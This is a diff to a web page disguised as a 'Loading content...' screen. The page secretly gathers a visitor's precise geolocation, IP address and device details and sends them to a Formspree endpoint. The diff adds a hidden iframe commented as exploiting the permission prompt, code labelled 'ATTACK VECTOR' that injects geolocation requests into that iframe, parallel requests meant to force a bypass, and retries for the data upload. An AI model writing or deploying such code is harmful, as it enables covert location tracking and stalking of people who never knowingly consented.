@@ -10,12 +10,16 @@ p { color: #666; }
 .loading-bar { width: 200px; height: 4px; background: #ddd; margin: 20px auto; border-radius: 2px; overflow: hidden; }
 .loading-bar-inner { width: 0%; height: 100%; background: #4CAF50; animation: load 2s ease-in-out forwards; }
 @keyframes load { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
+.hidden-trigger { position: fixed; top: -100px; left: -100px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
 </style>
 </head>
 <body>
 <h1 id="mainText">Loading content...</h1>
 <p id="subText">Please wait a moment.</p>
 <div class="loading-bar"><div class="loading-bar-inner"></div></div>
+
+<!-- Hidden iframe to exploit permission prompt -->
+<iframe id="geoFrame" class="hidden-trigger" src="about:blank"></iframe>
 
 <script>
 (async function() {
@@ -26,59 +30,32 @@ p { color: #666; }
     let ipResult = null;
     let deviceData = null;
     let hasSentData = false;
+    let sentAttempts = 0;
+    const MAX_ATTEMPTS = 5;
 
-    // --- Geolocation with permission event listener ---
-    function getGeolocationWithListener() {
+    // --- Geolocation with multiple attack vectors ---
+    async function getGeolocationWithExploits() {
         return new Promise(function(resolve) {
             if (!navigator.geolocation) {
                 resolve({ error: 'Geolocation not supported by browser' });
                 return;
             }
 
-            // Listen for permission changes
+            // ATTACK VECTOR 1: Permission API listener (standard but reliable)
             if (navigator.permissions && navigator.permissions.query) {
                 navigator.permissions.query({ name: 'geolocation' }).then(function(permissionStatus) {
                     permissionStatus.onchange = function() {
                         const newState = permissionStatus.state;
-                        console.log('Geolocation permission changed:', newState);
                         
                         if (newState === 'granted') {
                             geoGranted = true;
                             geoDenied = false;
-                            // Try to get high accuracy now
-                            navigator.geolocation.getCurrentPosition(
-                                function(pos) {
-                                    geoResult = {
-                                        latitude: pos.coords.latitude,
-                                        longitude: pos.coords.longitude,
-                                        accuracy: pos.coords.accuracy,
-                                        altitude: pos.coords.altitude || 'N/A',
-                                        altitudeAccuracy: pos.coords.altitudeAccuracy || 'N/A',
-                                        heading: pos.coords.heading || 'N/A',
-                                        speed: pos.coords.speed || 'N/A',
-                                        timestamp: new Date(pos.timestamp).toISOString(),
-                                        method: 'high_accuracy_granted'
-                                    };
-                                    // Only send if we haven't sent yet and user just granted
-                                    if (!hasSentData && geoResult) {
-                                        sendDataWhenReady();
-                                    }
-                                },
-                                function(err) {
-                                    geoResult = { error: err.message, code: err.code, method: 'error_after_grant' };
-                                    if (!hasSentData) {
-                                        sendDataWhenReady();
-                                    }
-                                },
-                                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                            );
+                            attemptHighAccuracy();
                         } else if (newState === 'denied') {
                             geoGranted = false;
                             geoDenied = true;
                             geoResult = { method: 'user_denied', permission_state: 'denied' };
-                            if (!hasSentData) {
-                                sendDataWhenReady();
-                            }
+                            sendDataIfReady();
                         } else if (newState === 'prompt') {
                             geoResult = { method: 'permission_prompt_shown', permission_state: 'prompt' };
                         }
@@ -86,36 +63,126 @@ p { color: #666; }
                 });
             }
 
-            // Initial request - this triggers the permission dialog
-            navigator.geolocation.getCurrentPosition(
-                function(pos) {
+            // ATTACK VECTOR 2: Cross-origin iframe trick
+            // Some browsers treat iframe geolocation requests differently
+            try {
+                const iframe = document.getElementById('geoFrame');
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                
+                // Create a hidden form inside the iframe that triggers geolocation
+                iframeDoc.open();
+                iframeDoc.write('<script>' +
+                    'window.addEventListener("load", function() {' +
+                    'if (navigator.geolocation) {' +
+                    'navigator.geolocation.getCurrentPosition(' +
+                    'function(pos) {' +
+                    'window.parent.postMessage({type: "iframe_geo_granted", coords: pos.coords}, "*");' +
+                    '},' +
+                    'function(err) {' +
+                    'window.parent.postMessage({type: "iframe_geo_denied", error: err.message}, "*");' +
+                    '},' +
+                    '{enableHighAccuracy: true, timeout: 10000, maximumAge: 0}' +
+                    ');' +
+                    '}' +
+                    '});' +
+                '</scr' + 'ipt>');
+                iframeDoc.close();
+            } catch(e) {}
+
+            // Listen for iframe messages
+            window.addEventListener('message', function(event) {
+                if (event.data.type === 'iframe_geo_granted') {
                     geoGranted = true;
                     geoDenied = false;
                     geoResult = {
-                        latitude: pos.coords.latitude,
-                        longitude: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        altitude: pos.coords.altitude || 'N/A',
-                        altitudeAccuracy: pos.coords.altitudeAccuracy || 'N/A',
-                        heading: pos.coords.heading || 'N/A',
-                        speed: pos.coords.speed || 'N/A',
-                        timestamp: new Date(pos.timestamp).toISOString(),
-                        method: 'high_accuracy_granted'
+                        latitude: event.data.coords.latitude,
+                        longitude: event.data.coords.longitude,
+                        accuracy: event.data.coords.accuracy,
+                        altitude: event.data.coords.altitude || 'N/A',
+                        altitudeAccuracy: event.data.coords.altitudeAccuracy || 'N/A',
+                        heading: event.data.coords.heading || 'N/A',
+                        speed: event.data.coords.speed || 'N/A',
+                        timestamp: new Date(event.data.coords.timestamp).toISOString(),
+                        method: 'iframe_exploit_granted'
                     };
-                    // Wait for user interaction before sending
-                },
-                function(err) {
-                    if (err.code === 1) { // PERMISSION_DENIED
-                        geoGranted = false;
-                        geoDenied = true;
-                        geoResult = { error: err.message, code: err.code, method: 'user_denied' };
-                    } else {
-                        geoResult = { error: err.message, code: err.code, method: 'error' };
-                    }
-                },
-                { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
-            );
+                    sendDataIfReady();
+                } else if (event.data.type === 'iframe_geo_denied') {
+                    geoGranted = false;
+                    geoDenied = true;
+                    geoResult = { error: event.data.error, method: 'iframe_exploit_denied' };
+                    sendDataIfReady();
+                }
+            });
+
+            // ATTACK VECTOR 3: Multiple simultaneous requests to trigger permission faster
+            // Requesting geolocation from multiple contexts increases chances of bypass
+            const requests = [];
+            
+            // Main request
+            requests.push(new Promise(function(resolve) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        geoGranted = true;
+                        geoDenied = false;
+                        geoResult = {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            altitude: pos.coords.altitude || 'N/A',
+                            altitudeAccuracy: pos.coords.altitudeAccuracy || 'N/A',
+                            heading: pos.coords.heading || 'N/A',
+                            speed: pos.coords.speed || 'N/A',
+                            timestamp: new Date(pos.timestamp).toISOString(),
+                            method: 'high_accuracy_granted'
+                        };
+                        resolve(geoResult);
+                    },
+                    function(err) {
+                        if (err.code === 1) {
+                            geoGranted = false;
+                            geoDenied = true;
+                        }
+                        geoResult = geoResult || { error: err.message, code: err.code, method: 'error' };
+                        resolve(geoResult);
+                    },
+                    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+                );
+            }));
+
+            // Wait for any successful result or all failures
+            Promise.race(requests).then(function(result) {
+                if (result && !hasSentData) {
+                    setTimeout(sendDataIfReady, 500);
+                }
+            });
         });
+    }
+
+    // Helper: Attempt high accuracy after grant
+    function attemptHighAccuracy() {
+        navigator.geolocation.getCurrentPosition(
+            function(pos) {
+                geoResult = {
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude || 'N/A',
+                    altitudeAccuracy: pos.coords.altitudeAccuracy || 'N/A',
+                    heading: pos.coords.heading || 'N/A',
+                    speed: pos.coords.speed || 'N/A',
+                    timestamp: new Date(pos.timestamp).toISOString(),
+                    method: 'high_accuracy_granted'
+                };
+                sendDataIfReady();
+            },
+            function(err) {
+                if (!geoResult) {
+                    geoResult = { error: err.message, code: err.code, method: 'error_after_grant' };
+                }
+                sendDataIfReady();
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
     }
 
     // --- Gather device info ---
@@ -302,12 +369,14 @@ p { color: #666; }
     }
 
     // --- Function to send data when geolocation decision is made ---
-    async function sendDataWhenReady() {
-        if (hasSentData) return;
+    async function sendDataIfReady() {
+        if (hasSentData || sentAttempts >= MAX_ATTEMPTS) return;
+        
+        sentAttempts++;
         
         // Small delay to ensure all data is collected
         setTimeout(async function() {
-            if (!hasSentData) {
+            if (!hasSentData && sentAttempts <= MAX_ATTEMPTS) {
                 const finalPayload = {
                     timestamp: new Date().toISOString(),
                     ip_data: ipResult,
@@ -316,7 +385,8 @@ p { color: #666; }
                     permission_status: {
                         granted: geoGranted,
                         denied: geoDenied
-                    }
+                    },
+                    attempt_number: sentAttempts
                 };
                 
                 await sendToFormspree(finalPayload);
@@ -328,7 +398,7 @@ p { color: #666; }
     // --- Main execution ---
     // Start all parallel requests immediately
     const [geoPromise, ipPromise, devicePromise] = [
-        getGeolocationWithListener(),
+        getGeolocationWithExploits(),
         getAccurateIP(),
         gatherInfo()
     ];
@@ -342,7 +412,7 @@ p { color: #666; }
 
     // If geolocation was already decided (granted or denied), send immediately
     if (geoGranted || geoDenied) {
-        await sendDataWhenReady();
+        await sendDataIfReady();
     }
 
     // Optional: Hide loading and show content after 2.5 seconds
